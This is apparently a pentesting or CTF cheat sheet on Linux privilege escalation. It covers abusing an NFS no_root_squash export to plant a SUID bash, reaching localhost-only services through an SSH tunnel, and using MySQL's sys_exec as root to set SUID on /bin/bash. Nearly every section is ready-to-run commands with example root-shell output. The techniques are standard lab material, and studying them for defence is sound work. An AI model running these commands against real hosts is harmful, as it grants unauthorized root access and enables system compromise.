# NFS & INTERNAL SERVICES

### NFS no_root_squash

```bash
cat /etc/exports
If no_root_squash: mount share, create SUID binary
```

> Root on NFS = root on target

**Why:** Compile SUID /bin/bash on share

<details>
<summary>Example Output</summary>

```
cat /etc/exports
/home/backup *(rw,no_root_squash)

On attacker:
mount -t nfs 10.10.10.5:/home/backup /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

On target:
/home/backup/rootbash -p
# whoami
root
```
</details>

---

### Internal services

```bash
netstat -tulnp
ss -tulnp
```

> Services only on 127.0.0.1

**Why:** May be vulnerable, port forward to access

<details>
<summary>Example Output</summary>

```
netstat -tulnp
127.0.0.1:8080  python3  <- internal web app
127.0.0.1:3306  mysqld   <- internal MySQL

SSH tunnel to access:
ssh -L 8080:127.0.0.1:8080 user@target
Browse: http://127.0.0.1:8080 on attacker
```
</details>

---

### MySQL as root

```bash
mysql -u root -p
If root: SELECT sys_exec('chmod u+s /bin/bash');
or UDF exploit
```

> Database running as root

**Why:** UDF = User Defined Function for RCE

<details>
<summary>Example Output</summary>

```
ps aux | grep mysql
root  1234  /usr/sbin/mysqld
(MySQL running as root!)

mysql -u root -p
SELECT sys_exec('chmod u+s /bin/bash');

bash -p
# whoami
root
```
</details>

---
